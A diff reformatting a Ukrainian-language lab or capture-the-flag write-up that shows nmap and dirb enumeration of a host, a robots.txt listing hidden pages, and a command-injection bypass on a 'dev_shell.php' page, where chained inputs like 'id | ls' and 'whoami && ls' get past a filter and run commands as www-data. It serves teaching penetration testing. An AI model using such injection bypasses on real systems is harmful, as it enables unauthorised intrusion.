@@ -18,9 +18,9 @@ nmap -sC -sV -Pn -p- 192.168.160.200
 ![alt text](./Images/image2.png)
 
 **Результат**:  
-• Port 21: FTP (ProFTPD 1.3.5b)
-• Port 80: HTTP (Apache web server httpd 2.4.25 (Debian))
-• Port 25468: SSH (OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0))
+- Port 21: FTP (ProFTPD 1.3.5b)
+- Port 80: HTTP (Apache web server httpd 2.4.25 (Debian))
+- Port 25468: SSH (OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0))
 
 **3. Дослідження вебсервера.**
 
@@ -36,20 +36,20 @@ dirb http://192.168.160.200
 ![alt text](./Images/image4.png)
 
 **Результат**:
-• index.html
-• robots.txt
-• server-status
+- index.html
+- robots.txt
+- server-status
 
 Переглядаємо `robots.txt`:
 
 ![alt text](./Images/image5.png)
 
 **Результат**:
-• User-agent: *
-• Disallow: /login.php
-• Disallow: /dev_shell.php
-• Disallow: /lat_memo.html
-• Disallow: /passwords.html
+- User-agent: *
+- Disallow: /login.php
+- Disallow: /dev_shell.php
+- Disallow: /lat_memo.html
+- Disallow: /passwords.html
 
 Переглядаємо шляхи і звертаємо увагу на `http://192.168.160.200/dev_shell.php`
 
@@ -73,17 +73,17 @@ dirb http://192.168.160.200
 ```sh
 Id
 ```
-**Output:**
+**Output**:
 uid=33(www-data) gid=33(www-data) groups=33(www-data),100(users)
 ```sh
 ls
 ```
-**Output:**
+**Output**:
 Get out skid lol
 ```sh
 id | ls  або whoami && ls
 ```
-**Output:**
+**Output**:
 WIP.jpg
 about.html
 contact.html
